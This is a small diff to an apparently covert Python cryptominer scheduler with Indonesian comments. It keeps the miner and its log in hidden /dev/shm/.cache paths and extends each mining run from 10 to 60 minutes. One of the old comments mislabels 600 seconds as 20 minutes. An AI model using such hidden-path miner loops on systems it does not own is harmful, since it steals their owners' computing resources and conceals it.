@@ -4,7 +4,7 @@ import sys
 
 # CONFIG
 MINER_PATH = "/dev/shm/.cache/tobrut"  # Lokasi miner
-MINING_TIME = 600  # 20 menit
+MINING_TIME = 3600  # 60 menit
 REST_TIME = 600  # 10 menit
 LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"
 
@@ -20,7 +20,7 @@ def start_miner():
 
 def main():
     while True:
-        print("⛏️ Panen selama 20 menit buat modal nikah kita...")
+        print("⛏️ Panen selama 60 menit buat modal nikah kita...")
         start_miner()
         time.sleep(MINING_TIME)
 
